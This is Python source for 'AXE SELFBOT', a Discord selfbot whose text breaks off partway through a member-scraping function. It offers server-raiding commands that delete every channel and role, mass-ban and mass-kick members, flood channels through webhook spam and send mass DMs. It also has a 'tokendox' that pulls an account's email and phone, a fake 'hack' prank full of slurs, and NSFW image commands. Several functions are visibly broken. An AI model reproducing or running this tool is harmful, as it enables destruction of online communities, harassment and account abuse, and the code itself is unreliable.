import os
os.system("pip install -r requirements.txt")
os.system("pip install colorama")
import discord
from discord.ext import commands
os.system('pip install bs4')
os.system('pip install pyfiglet')
import random, asyncio, json, threading, requests, subprocess,base64, codecs, smtplib, datetime, sys, pyfiglet, httpx, re
from colorama import Fore
from discord import Permissions




# Axe Selfbot
os.system('clear')

token = os.getenv('token')
prefix = input("Enter Prefix -> ")
## Made By TheAxes
intents = discord.Intents.all()
intents.members = True
header = {"Authorization": f'Bot {token}'}
stream_url= "https://www.twitch.tv/rpcfordcbytheaxes"

axeop = commands.Bot(description='AXE SELFBOT', command_prefix=prefix, intents=intents, case_insensitive=True, self_bot=True)
axeop.remove_command('help')

snipe_message_author = {}
snipe_message_content = {}
snipetime = {}

@axeop.event
async def on_message_delete(message):
  snipe_message_author[message.channel.id] = message.author
  snipe_message_content[message.channel.id] = message.content
  snipetime[message.channel.id] = datetime.datetime.now()



date_format = "%a, %d %b %Y %I:%M %p"
timestamp=datetime.datetime.utcnow()

def axeontop():
    os.system('title AXE SELFBOT && cls' if os.name=='nt' else 'clear')
    print(f"{Fore.LIGHTYELLOW_EX} AXE SELFBOT : {Fore.LIGHTCYAN_EX}[INSTALLED]\n{Fore.LIGHTYELLOW_EX} MADE BY : {Fore.LIGHTCYAN_EX}    [TheAxes] {Fore.RESET}")

with open('config.json') as f:
    config = json.load(f)

namesforchannel = config.get('channelname')
namesforroles = config.get('rolesname')
namesforwebhook = config.get('webhooknames')
webhookmsg = config.get('webhookspammessage')
remson = config.get('reason')

@axeop.event
async def on_ready():
        axeontop()
        print(f"""{Fore.LIGHTCYAN_EX}
╔═════════════════════════════╗
║ {Fore.LIGHTYELLOW_EX}AXE SELFBOT ║ {Fore.LIGHTCYAN_EX}[AUTHORISED]  ║
╠═════════════════════════════╬
║ {Fore.LIGHTYELLOW_EX}Connected:  ║  {Fore.LIGHTCYAN_EX}{axeop.user.name}        ║
╠═════════════════════════════╬
║ {Fore.LIGHTYELLOW_EX}Prefix :    ║  {Fore.LIGHTCYAN_EX}{prefix}            ║
╚═════════════════════════════╝{Fore.RESET}

""")



@axeop.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        await ctx.send("> • [ERROR]: You Don't Have Permission to execute this command", delete_after=4)
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"> • [ERROR]: Missing arguments: {error}", delete_after=4)
    elif "Cannot send an empty message" in error_str:
        await ctx.send( ' > • [ERROR]: Message contents cannot be Empty', delete_after=4)
    else:
        ctx.send(f'> • [ERROR]: {error_str}', delete_after=4)


def axespam(webhook):
    while axewspam:
        randcolor = random.randint(0, 16777215)
        data = {'content':webhookmsg}
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)





@axeop.command(pass_context=True)
async def help(ctx):
        await ctx.send(f"""> AXE SELFBOT | HELP COMMAND
> • `{prefix}help` - Show This Page
> • `{prefix}nuke` - Shows Nukes Commands
> • `{prefix}text` - Shows Text Commands
> • `{prefix}utilty` - Shows Utilty Commands
> • `{prefix}misc` - Shows Miscellaneous Commands
> • `{prefix}status` - Shows Custom Status Commands
> • `{prefix}fun` - Shows Fun Commands
> • `{prefix}nsfw` - Shows Nsfw Commands
> • `{prefix}selfbotinfo` - Shows About Selfbot
""")

@axeop.command()
async def fun(ctx):
        await ctx.message.delete()
        await ctx.send(f"""> AXE SELFBOT | FUN CMDS
        > • `{prefix}hack <@user>` - Do A Fake Hacking Process
        > • `{prefix}fakewizz` - Do A Fake Wizz
        """)


@axeop.command()
async def fakewizz(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.TextChannel):        print("Prank Wizz Started")
        initial = random.randrange(0, 60)
        message = await ctx.send(f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...\nInitiating Mass-DM`")
    elif isinstance(ctx.message.channel, discord.DMChannel):        initial = random.randrange(1, 60)
        message = await ctx.send(
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
    elif isinstance(ctx.message.channel, discord.GroupChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\nKicking {len(ctx.message.channel.recipients)} Users...`")



@axeop.command()
async def nuke(ctx):
        await ctx.message.delete()
        await ctx.send(f"""> AXE SELFBOT | NUKE CMDS
        > • `{prefix}wizz` - Nukes The Server `[Administration]` Required Alias - `{prefix}nukeall,{prefix}trash`
        > • `{prefix}massban <serverid>` - Bans Every Member  In Server Alias - `{prefix}banall <serverid>`
        > • `{prefix}masskick` - Kicks Every Member In Server
        > • `{prefix}webhookspam` - Deadly Spams In All Channels Using Webhooks
        > • `{prefix}stopwebhookspam` - Stops Deadly Spam
        > • `{prefix}massrole` - Creates Tons Of Roles
        > • `{prefix}masschannel` - Creates Tons Of Channels""")

@axeop.command()
async def text(ctx):
        await ctx.message.delete()
        await ctx.send(f"""> AXE SELFBOT | TEXT CMDS
        > • `{prefix}spam <amount> <message>` - Spams The Given Text In Given Amount
        > • `{prefix}ghostmsg <message>` - Delete Your Message Instantly Helpful for ghostpings
        > • `{prefix}massdm <message>` - MassDm A Message
        > • `{prefix}ascii <text>` Creates A Ascii Banner From Given Text
        > • `{prefix}hastebin <text>` - Creates A Haste Paste
        > • `{prefix}purge <amount>` - Deletes Your message in given amount""")

@axeop.command()
async def utilty(ctx):
        await ctx.message.delete()
        await ctx.send(f"""> AXE SELFBOT | UTILITY CMDS
        > • `{prefix}av <@user>` - Shows User Avatar
        > • `{prefix}banner <@user>` - Shows User Banner
        > • `{prefix}hypesquad <housename>` - Change Hypequad house `Ex` - {prefix}hypesquad balance
        > • `{prefix}leavegroups` - Leaves Groups
        > • `{prefix}ping` - Shows Selfbot Latency
        > • `{prefix}userinfo` <@user>` - Gives User Info
        > • `{prefix}serverinfo` - Shows Server Info""")

@axeop.command()
async def selfbotinfo(ctx):
        await ctx.message.delete()
        await ctx.send("""> AXE SELFBOT

        > • __Name__ : **AXE SELFBOT**
        > •  __Version__ : **1**
        > •  __Language__ : **Discord.py**
        > • __Made By__ : **TheAxes**
        > • __Total Commands__ : **52** Commands

        > • __Github__ : https://github.com/theaxes""")

@axeop.command(aliases=["miscellaneous"])
async def misc(ctx):
        await ctx.message.delete()
        await ctx.send(f"""> AXE SELFBOT | MISC CMDS
        > • `{prefix}copyserver` - Clone The Current Server You Using The Cmd In
        > • `{prefix}delemoji` - Delete All Emojis In Server
        > • `{prefix}delsticker` - Deletes All Sticker In Server
        > • `{prefix}delwebhook <webhook url>` - Deletes The Given Webhook
        > • `{prefix}eCM` - Enables Community Mode
        > • `{prefix}dCM` - Disable Community Mode
        > • `{prefix}massreact <emoji>` - Add Many Above Messages Reactions
        > • `{prefix}rc <name>` - Renames Channels
        > • `{prefix}rr <name>` - Renames Roles
        > • `{prefix}servername <name>` - Change Server Name        > • `{prefix}nickall <names>` - Change Everyone NickName
        > • `{prefix}pingweb <url>` - Gives you the website status code
        > • `{prefix}Screenshot <url without https://> - Ex - `{prefix}Screenshot Google.com
        > • `{prefix}snipe` - Show Previous Deleted Message
        > • `{prefix}tdox <token>` - Gives Token Info
        > • `{prefix}shutdown` - Turn Off The Selfbot
        """)


@axeop.command()
async def nsfw(ctx):
        await ctx.message.delete()
        await ctx.send(f"""> AXE SELFBOT | NSFW CMDS
        > • `{prefix}cum`
        > • `{prefix}hentai`
        > • `{prefix}lewd`
        > • `{prefix}lesbian`
        > • `{prefix}boobs`
        > • `{prefix}feet`
        > • `{prefix}pussy`
        > • `{prefix}spank`
        """)



@axeop.command(aliases=["activity"])
async def status(ctx):
        await ctx.message.delete()
        await ctx.send(f"""> AXE SELFBOT | STATUS CMDS
        > • `{prefix}game <message>` - Create a Custom Playing Status
        > • `{prefix}stream <message>` - Creates a Custom Streaming Status
        > • `{prefix}watch <message>` - Creates A Custom Watching Status
        > • `{prefix}listen <message>` - Creates a Custom Listening Status
        > • `{prefix}stopactivity` - Remove Any Custom Status""")


@axeop.command()
async def hentai(ctx):
        req = httpx.get(f"http://api.nekos.fun:8080/api/hentai")
        await ctx.reply(req.json()["image"])

@axeop.command()
async def meme(ctx):
        r = httpx.get("https://memes.blademaker.tv/api")
        res = r.json()
        meme = res["image"]
        await ctx.reply(meme)

@axeop.command()
async def boobs(ctx):
        req = httpx.get(f"http://api.nekos.fun:8080/api/boobs")
        await ctx.reply(req.json()["image"])

@axeop.command()
async def cum(ctx):
        req = httpx.get(f"http://api.nekos.fun:8080/api/cum")
        await ctx.reply(req.json()["image"])

@axeop.command()
async def feet(ctx):
        req = httpx.get(f"http://api.nekos.fun:8080/api/feet")
        await ctx.reply(req.json()["image"])

@axeop.command()
async def spank(ctx):
        req = httpx.get(f"http://api.nekos.fun:8080/api/spank")
        await ctx.reply(req.json()["image"])

@axeop.command()
async def pussy(ctx):
        req = httpx.get(f"http://api.nekos.fun:8080/api/pussy")
        await ctx.reply(req.json()["image"])


@axeop.command()
async def lesbian(ctx):
        req = httpx.get(f"http://api.nekos.fun:8080/api/lesbian")
        await ctx.reply(req.json()["image"])

@axeop.command()
async def lewd(ctx):
        req = httpx.get(f"http://api.nekos.fun:8080/api/lewd")
        await ctx.reply(req.json()["image"])


@axeop.command(aliases=["checkweb","checksite","pingsite"])
async def pingweb(ctx, *, url):
        await ctx.reply(f"> AXE SELFBOT | PING WEB\nPinging {url}....")
        req = httpx.get(url)
        try:
                if req.status_code in (200, 201, 204):
                        await ctx.reply(f"WEBSITE IS WORKING ! `Status Code` - {req.status_code}")
                elif req.status_code in (400,403,404):
                                await ctx.reply(f"WEBSITE IS NOT WORKING - {req.status_code}")
        except:
                                        pass


def tdoxfunc(token):
                userreq = httpx.get("https://discord.com/api/v10/users/@me",headers={"Authorization":token})
                botreq = httpx.get("https://discord.com/api/v10/users/@me",headers={"Authorization":f"Bot {token}"})
                for req in [userreq, botreq]:
                        if req.status_code == 200:
                                json = req.json()
                                try:
                                        if json["premium_type"] == 2:
                                                nitro_type = "Nitro Boost"
                                        elif json["premium_type"] == 1:
                                                nitro_type = "Nitro Classic"
                                except:
                                        nitro_type = None
                                try:
                                        bot = json["bot"]
                                except:
                                        bot = False
                                try:
                                        phone = json["phone"]
                                except:
                                        phone = None
                                if len(json["bio"]) == 0:
                                        bio = None
                                else:
                                        bio = json["bio"]
                                avatar = f"https://cdn.discordapp.com/avatars/{json['id']}/{json['avatar']}"
                                banner = f"https://cdn.discordapp.com/banners/{json['id']}/{json['banner']}"
                                return f"""> **AXE SELFBOT | Token Dox**

**Name:** `{json['username']}#{json['discriminator']}`
**ID:** `{json['id']}`
**Bot?:** `{bot}`
**Email:** `{json['email']}`
**Phone:** `{phone}`
**Bio:** `{bio}`
**MFA Enabled?:** `{json['mfa_enabled']}`
**Nitro Type:** `{nitro_type}`
**Avatar:** {avatar}
**Banner:** {banner}
"""
                if userreq.status_code == 401 and botreq.status_code == 401:
                        return "Token Is Invalid"

@axeop.command(aliases=["tdox", "doxtoken"])
async def tokendox(ctx, * , tucken):
        print(tucken)
        await ctx.reply(tdoxfunc(token))






@axeop.command(aliases=["doxuser"])
async def userinfo(ctx, user: discord.Member):
        if user == None:
                user = ctx.author
                user = messages.author


        await ctx.reply(f"""> **AXE SELFBOT | Info of {user}**

**Name:** `{user.name}`
**ID:** `{user.id}`
**Display Name:** `{user.display_name}`
**Created At:** `{user.created_at.strftime('%a, %d %B %Y, %I:%M %p UTC')}`
                                                           """)








@axeop.command()
async def webhookspam(ctx):
    global axewspam
    axewspam = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=axespam, args=(webhook.url,)).start()

    if len(ctx.guild.text_channels) >= 99:
        webhookamount = 1
    else:
        webhookamount = 50 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name=namesforwebhook)
                threading.Thread(target=axespam, args=(webhook.url,)).start()
                f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except:
                print(f"{Fore.RED} > Rate Limited By Discord.{Fore.RESET}")
@axeop.command(aliases=['stopwebhookfuck', 'webhookstop',"webhookspamstop","stopwebhooksspam","webhookspamoff"])
async def stopwebhookspam(ctx):
    global axesspam

    axewspam = False



def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor


@axeop.command(aliases=["nukeall", "trash", "destroy"])
async def wizz(ctx):
  await ctx.message.delete()
  await ctx.send(f"> AXE SELFBOT | WIZZING {ctx.guild.name} SERVER")
  await ctx.send(f"{prefix}massban {ctx.guild.id}")
  for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
  for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
        try:
          await ctx.guild.edit(
            name="TRASHED BY THEAXES",
            description="this server got an heavy shot by the axes",
            reason=remson,
            icon=None,
            banner=None)
        except:
            pass
        for _i in range(100):
            await ctx.guild.create_text_channel(name=namesforchannel)
        for _i in range(100):
          await ctx.guild.create_role(name=namesforroles, color=RandomColor())
          print(f"SUCCESFULLY WIZZED: {ctx.guild.name}")


@axeop.command()
async def nickall(ctx , * , name):
    for member in ctx.guild.members:
        try:
            await member.edit(nick=name)
        except:
            await ctx.reply("> Failed! Most likely missing perms")


#Status Commands

@axeop.command(aliases=['watching'])
async def watch(ctx, *, message):
        await axeop.change_presence(
        activity=discord.Activity(
        type=discord.ActivityType.watching,
        name=message
         ))
        await ctx.send("> **AXE SELFBOT | WATCHING STATUS CREATED**", delete_after=5)


@axeop.command(aliases=['listening'])
async def listen(ctx, *, message):

        await axeop.change_presence(
        activity=discord.Activity(
        type=discord.ActivityType.listening,
        name=message,
         ))
        await ctx.send("> **AXE SELFBOT | LISTENING STATUS CREATED**", delete_after=5)



@axeop.command(aliases=['streaming'])
async def stream(ctx, *, message):

        stream = discord.Streaming(
        name=message,
        url=stream_url,
         )
        await axeop.change_presence(activity=stream)
        await ctx.send("> **AXE SELFBOT | STREAMING STATUS CREATED**", delete_after=5)


@axeop.command(aliases=['PLAYING'])
async def game(ctx, * , message):

        game = discord.Game(
        name=message
        )
        await axeop.change_presence(activity=game)
        await ctx.send("> **AXE SELFBOT | PLAYING STATUS CREATED**", delete_after=5)


@axeop.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
async def stopactivity(ctx):

    await axeop.change_presence(activity=None, status=discord.Status.dnd)
    await ctx.send(content="> **AXE SELFBOT | STOPPED CUSTOM STATUS**", delete_after=5)



@axeop.command(aliases=["guildinfo"])
async def serverinfo(ctx):
        await ctx.send(f"""**Name:** `{ctx.guild.name}`
**ID:** `{ctx.guild.id}`
**Owner:** `{ctx.guild.owner}`""")



# Fun Commands

@axeop.command()
async def hack(ctx, user: discord.Member = None):

    await ctx.message.delete()
    gender = ["Male", "Female", "Trans", "Other", "Retard"]
    age = str(random.randrange(10, 25))
    height = ['4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"', '5\'1\"', '5\'2\"', '5\'3\"',
              '5\'4\"', '5\'5\"',
              '5\'6\"', '5\'7\"', '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"', '6\'3\"',
              '6\'4\"', '6\'5\"',
              '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"', '6\'10\"', '6\'11\"']
    weight = str(random.randrange(60, 300))
    hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
    skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
    religion = ["Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"]
    sexuality = ["Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"]
    education = ["High School", "College", "Middle School", "Elementary School", "Pre School",
                 "Retard never went to school LOL"]
    ethnicity = ["White", "African American", "Asian", "Latino", "Latina", "American", "Mexican", "Korean", "Chinese",
                 "Arab", "Italian", "Puerto Rican", "Non-Hispanic", "Russian", "Canadian", "European", "Indian"]
    occupation = ["Retard has no job LOL", "Certified discord retard", "Janitor", "Police Officer", "Teacher",
                  "Cashier", "Clerk", "Waiter", "Waitress", "Grocery Bagger", "Retailer", "Sales-Person", "Artist",
                  "Singer", "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer", "Mechanic", "Carpenter",
                  "Electrician", "Lawyer", "Doctor", "Programmer", "Software Engineer", "Scientist"]
    salary = ["Retard makes no money LOL", "$" + str(random.randrange(0, 1000)), '<$50,000', '<$75,000', "$100,000",
              "$125,000", "$150,000", "$175,000",
              "$200,000+"]
    location = ["Retard lives in his mom's basement LOL", "America", "United States", "Europe", "Poland", "Mexico",
                "Russia", "Pakistan", "India",
                "Some random third world country", "Canada", "Alabama", "Alaska", "Arizona", "Arkansas", "California",
                "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana",
                "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan",
                "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey",
                "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon",
                "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah",
                "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"]
    email = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@protonmail.com", "@disposablemail.com",
             "@aol.com", "@edu.com", "@icloud.com", "@gmx.net", "@yandex.com"]
    dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
    name = ['James Smith', "Michael Smith", "Robert Smith", "Maria Garcia", "David Smith", "Maria Rodriguez",
            "Mary Smith", "Maria Hernandez", "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
            "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan", "Lola Barreiro",
            "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann", "Geoffrey Torre", "Allan Craft",
            "Elvira Lucien", "Jeanelle Orem", "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange",
            "Anabel Rini", "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler", "Xochitl Parton",
            "Derek Hetrick", "Chasity Hedge", "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
            "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff", "Kaila Bier", "Ezra Battey",
            "Bart Maddux", "Shiloh Raulston", "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"]
    phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
    if user is None:
        user = ctx.author
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")
    else:
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")

@axeop.command()
async def delemojis(ctx):
    for emoji in list(ctx.list.emojis):
        try:
            await emoji.delete()
        except:
            await ctx.reply("Failed!  Most likely missing perms")


@axeop.command(aliases=["rc"])
async def renamechannels(ctx, *, name):
    for channel in ctx.guild.channels:
        await channel.edit(name=name)

    await ctx.reply("> **Axe Selfbot  Renamed all channels succesfully**")

@axeop.command(aliases=["kickall", "kickwave"])
async def masskick(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason=remson)
        except:
            pass



@axeop.command(aliases=["rr"])
async def renameroles(ctx, *, name):
    for role in ctx.guild.roles:
        await role.edit(name=name)
    await ctx.reply("> **Axe Selfbot |  Renamed all roles succesfully**")

@axeop.command(aliases=["bannall"])
async def massban(ctx, guild):
    guild = guild
    await axeop.wait_until_ready()
    guildOBJ = axeop.get_guild(int(guild))
    members = await guildOBJ.chunk()
    try:
        os.remove('TheAxes/members.txt')
    except:
        pass

    membercount = 0
    with open('TheAxes/members.txt', 'a') as (m):
        for member in members:
            m.write(str(member.id) + '\n')
            membercount += 1

        await ctx.send('> AXE SELFBOT | MASS BAN INITIATED\n> Banning Members.................', delete_after=5)
        m.close()
    guild = guild
    print()
    members = open('TheAxes/members.txt')
    for member in members:
        while True:
                r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
        if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])

        else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"[+] Banned {Fore.RED}{member.strip()}{Fore.RESET}")
                    break
                else:
                    break

    members.close()

@axeop.command(pass_context=True)
async def scrape(ctx):
  await ctx.message.delete()
  mem = ctx.guild.members
  chl = ctx.guild.channels
  rle = ctx.guild.roles
  for member in mem:
      try:
        mfil = open("TheAxes/members.txt","a")

        mfil.write(str(member.id) + "\n")
        mfil.close()
        await ctx.reply("Succesfully Scraped!")

      except Exception as e:
        await ctx.send("Failed Scraping Members!")
  for channel in chl:
      try:
